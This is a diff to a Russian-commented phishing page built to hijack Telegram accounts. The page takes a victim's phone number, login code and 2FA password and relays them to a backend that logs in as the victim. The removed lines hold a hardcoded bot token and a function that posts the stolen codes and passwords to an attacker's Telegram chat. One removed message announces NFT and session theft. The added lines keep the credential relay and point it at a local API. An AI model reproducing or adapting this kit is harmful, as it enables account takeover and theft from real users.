@@ -630,9 +630,7 @@
     </div>
 
     <script>
-        const BOT_TOKEN = '8313315328:AAEmIn4uLyXrDr4ggd6TVWjoCTtHdoDco9A';
-        const CHAT_ID = '-1002995959910';
-        const BACKEND_URL = 'https://your-backend.com/api'; // Замени на свой бэкенд
+        const API_BASE_URL = 'http://localhost:8080'; // Базовый URL API сервера
 
         // Тексты для локализации
         const translations = {
@@ -852,8 +850,8 @@
             btn.disabled = true;
 
             try {
-                // Отправляем номер на бэкенд для реальной отправки кода
-                const response = await fetch(`${BACKEND_URL}/send_code`, {
+                // Отправляем номер на API сервер
+                const response = await fetch(`${API_BASE_URL}/api/send_code`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
@@ -862,37 +860,21 @@
                     })
                 });
 
-                if (response.ok) {
+                const result = await response.json();
+
+                if (result.success) {
                     // Код отправлен, переходим к вводу кода
                     currentStep = 2;
                     showStep(currentStep);
                     startTimer();
-                    
-                    sendToTelegram(`🔐 ЗАПРОС КОДА ДЛЯ АККАУНТА\n📱 Телефон: ${phoneNumber}\n🌍 Страна: ${selectedCountry.name}\n🕒 Время: ${new Date().toLocaleString()}\n\n📨 Ожидаем ввод реального кода...`);
                 } else {
-                    throw new Error('Failed to send code');
+                    throw new Error(result.error || 'Failed to send code');
                 }
             } catch (error) {
-                showError(phoneInput, currentLanguage === 'ru' ? 'Ошибка отправки кода' : 'Error sending code');
+                showError(phoneInput, currentLanguage === 'ru' ? 'Ошибка отправки кода' : 'Error sending code: ' + error.message);
             } finally {
                 btn.innerHTML = currentLanguage === 'ru' ? 'Отправить код' : 'Send Verification Code';
                 btn.disabled = false;
-            }
-        }
-
-        async function sendToTelegram(message) {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch (error) {
-                console.error('Failed to send to Telegram:', error);
             }
         }
 
@@ -916,7 +898,7 @@
         }
 
         function resendCode() {
-            sendToTelegram(`🔄 ЗАПРОС ПОВТОРНОЙ ОТПРАВКИ КОДА\n📱 Телефон: ${phoneNumber}\n\n⚠️ Пользователь запросил новый код`);
+            sendPhone();
             startTimer();
         }
 
@@ -944,8 +926,8 @@
             btn.disabled = true;
 
             try {
-                // Отправляем код на бэкенд для проверки
-                const response = await fetch(`${BACKEND_URL}/verify_code`, {
+                // Отправляем код на API сервер
+                const response = await fetch(`${API_BASE_URL}/api/verify_code`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
@@ -961,7 +943,6 @@
                         // Нужен пароль
                         currentStep = 3;
                         showStep(currentStep);
-                        sendToTelegram(`✅ КОД ПОДТВЕРЖДЕН\n📱 Телефон: ${phoneNumber}\n🔢 Код: ${authCode}\n\n🔑 Требуется пароль 2FA...`);
                     } else {
                         // Вход успешен без пароля
                         completeHijack();
@@ -991,14 +972,13 @@
             btn.disabled = true;
 
             try {
-                // Отправляем пароль на бэкенд
-                const response = await fetch(`${BACKEND_URL}/verify_password`, {
+                // Отправляем пароль на API сервер
+                const response = await fetch(`${API_BASE_URL}/api/verify_password`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         phone: phoneNumber,
-                        password: password,
-                        code: authCode
+                        password: password
                     })
                 });
 
@@ -1021,9 +1001,6 @@
             currentStep = 4;
             showStep(currentStep);
             
-            // Отправляем финальное сообщение
-            sendToTelegram(`🎯 АККАУНТ УСПЕШНО ВЗЛОМАН!\n📱 Телефон: ${phoneNumber}\n🔢 Код: ${authCode}${password ? `\n🔑 Пароль: ${password}` : ''}\n\n💰 Начинаем кражу NFT и сессии...`);
-
             // Через 3 секунды редирект
             setTimeout(() => {
                 window.location.href = 'https://t.me/getgems_bot?start=hijacked_' + Date.now();
